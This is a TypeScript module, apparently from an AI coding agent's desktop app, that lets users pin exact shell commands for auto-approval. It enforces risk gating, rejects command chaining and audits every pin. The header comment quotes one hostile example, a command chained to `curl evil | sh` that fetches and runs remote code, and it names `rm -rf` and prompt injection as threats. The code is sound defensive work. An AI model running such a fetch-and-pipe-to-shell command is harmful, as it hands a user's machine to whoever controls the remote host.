/**
 * Scoped command allowlist — the approval-fatigue fix.
 *
 * Threat model: approval cards train users to rubber-stamp (the 10th
 * `cargo check` prompt gets a reflexive Approve, and so does the 1st
 * dangerous command that follows). Instead of an "all" auto-approve that
 * rubber-stamps everything, the user can pin EXACT command strings as
 * "always allow". Each pinned command is then executed without a card;
 * everything else still stops for review. Fewer prompts → more attention
 * on the ones that remain.
 *
 * Safety properties:
 *  - EXACT-MATCH ONLY: the stored string must equal the incoming command
 *    byte-for-byte. `cargo check` allowed ≠ `cargo check && curl evil | sh`
 *    allowed — chaining a second command produces a different string.
 *  - RISK-GATED ENTRY: only commands the policy layer rates low-risk and
 *    that contain no shell chaining/substitution can be pinned at all.
 *    `rm -rf` can never be allowlisted, by construction.
 *  - AGENT-UNWRITABLE STORE: entries live at
 *    `~/.kai/allowlist/<workspace-hash>/allowlist.json` — outside every
 *    project (compare kaiPaths.ts rationale), and the path is blocked for
 *    agent writes by security.ts (`PROTECTED_DIRS`), so a prompt injection
 *    cannot self-grant future approvals.
 *  - AUDITED: every pin and every allowlisted execution lands in the audit
 *    trail.
 */

import { LazyStore } from "@tauri-apps/plugin-store";
import { homeDir } from "@tauri-apps/api/path";
import { normalizeWorkspacePath } from "./workspacePath";
import { djb2 } from "./kaiPaths";
import { analyzeShellCommand } from "./policy";
import { auditAppend, AUDIT_KINDS } from "./audit";

const MAX_ENTRIES = 100;

export type AllowlistEntry = {
  /** The exact command string that will be auto-approved. */
  command: string;
  /** Pinned at (ms epoch). */
  pinnedAt: number;
};

type StoreShape = { commands: AllowlistEntry[] };

/** In-memory cache per workspace, mirroring the sandbox config pattern. */
const cache = new Map<string, Set<string>>();
const loadedRoots = new Set<string>();

function storePathFor(root: string): string {
  const hash = djb2(normalizeWorkspacePath(root) ?? root).toString(16);
  return `allowlist/${hash}.json`;
}

async function loadRoot(root: string): Promise<Set<string>> {
  const cached = cache.get(root);
  if (cached) return cached;
  const store = new LazyStore(storePathFor(root), { defaults: {}, autoSave: 200 });
  let commands: string[] = [];
  try {
    const raw = (await store.get<StoreShape>("allowlist")) ?? { commands: [] };
    commands = Array.isArray(raw.commands)
      ? raw.commands.map((e) => e?.command).filter((c): c is string => typeof c === "string" && c.length > 0)
      : [];
  } catch {
    commands = [];
  }
  const set = new Set(commands);
  cache.set(root, set);
  loadedRoots.add(root);
  return set;
}

/**
 * Can this command be pinned at all? Conservative gate:
 *  - the policy analyzer must rate it low-risk (no rm/sudo/eval/…)
 *  - its own `safe` verdict must hold (passes the hard deny-lists)
 *  - no shell chaining (`&&`, `||`, `;`, `|`), substitution, or redirection —
 *    a pinned command must be ONE simple invocation
 *  - bounded length
 */
export function isAllowlistable(command: string): boolean {
  const cmd = command.trim();
  if (!cmd || cmd.length > 200) return false;
  const analysis = analyzeShellCommand(cmd);
  if (!analysis.safe) return false;
  if (analysis.riskLevel !== "low") return false;
  if (analysis.warnings.length > 0) return false;
  // One simple command: no chaining, no pipes, no substitution, no
  // redirection, no backgrounding, no line continuation.
  if (/[;&|]|\$\(|`|>|<|&\s*$|\\\n/.test(cmd)) return false;
  return true;
}

/** Would an incoming command auto-approve under the allowlist for `root`? */
export async function isCommandAllowed(
  command: string,
  root: string | null,
): Promise<boolean> {
  if (!root) return false;
  const cmd = command.trim();
  if (!cmd) return false;
  const set = await loadRoot(root);
  if (!set.has(cmd)) return false;
  // Defense in depth: the pinned entry must STILL be allowlistable under
  // today's rules — a future rule-tightening (or a tampered store) can't
  // keep an old dangerous pin active.
  if (!isAllowlistable(cmd)) return false;
  auditAppend(AUDIT_KINDS.toolExec, "bash_run", `allowlisted: ${cmd.slice(0, 160)}`, root);
  return true;
}

/** Pin a command as always-allowed for this workspace. Audited. */
export async function pinCommand(root: string, command: string): Promise<boolean> {
  if (!isAllowlistable(command)) return false;
  const set = await loadRoot(root);
  if (set.size >= MAX_ENTRIES && !set.has(command)) return false;
  set.add(command.trim());
  await persist(root, set);
  auditAppend(
    AUDIT_KINDS.sandboxChange,
    "allowlist",
    `pinned: ${command.trim().slice(0, 160)}`,
    root,
  );
  return true;
}

/** Remove a pinned command. Audited. */
export async function unpinCommand(root: string, command: string): Promise<void> {
  const set = await loadRoot(root);
  if (set.delete(command.trim())) {
    await persist(root, set);
    auditAppend(
      AUDIT_KINDS.sandboxChange,
      "allowlist",
      `unpinned: ${command.trim().slice(0, 160)}`,
      root,
    );
  }
}

/** All pinned commands for a workspace, in pin order (store keeps order). */
export async function listCommands(root: string): Promise<AllowlistEntry[]> {
  const store = new LazyStore(storePathFor(root), { defaults: {}, autoSave: 200 });
  try {
    const raw = (await store.get<StoreShape>("allowlist")) ?? { commands: [] };
    return Array.isArray(raw.commands)
      ? raw.commands.filter(
          (e): e is AllowlistEntry =>
            !!e && typeof e.command === "string" && e.command.length > 0,
        )
      : [];
  } catch {
    return [];
  }
}

async function persist(root: string, set: Set<string>): Promise<void> {
  const store = new LazyStore(storePathFor(root), { defaults: {}, autoSave: 200 });
  const entries: AllowlistEntry[] = [];
  for (const command of set) {
    entries.push({ command, pinnedAt: Date.now() });
  }
  await store.set("allowlist", { commands: entries });
  await store.save();
}

/**
 * The audit trail needs no separate allowlist dir path — but the Security
 * panel shows where the store lives. Same keying as storePathFor.
 */
export async function allowlistDirFor(root: string): Promise<string> {
  const home = await homeDir();
  const homeNorm = home.replace(/\\/g, "/").replace(/\/+$/, "");
  const hash = djb2(normalizeWorkspacePath(root) ?? root).toString(16);
  return `${homeNorm}/.kai/allowlist/${hash}`;
}
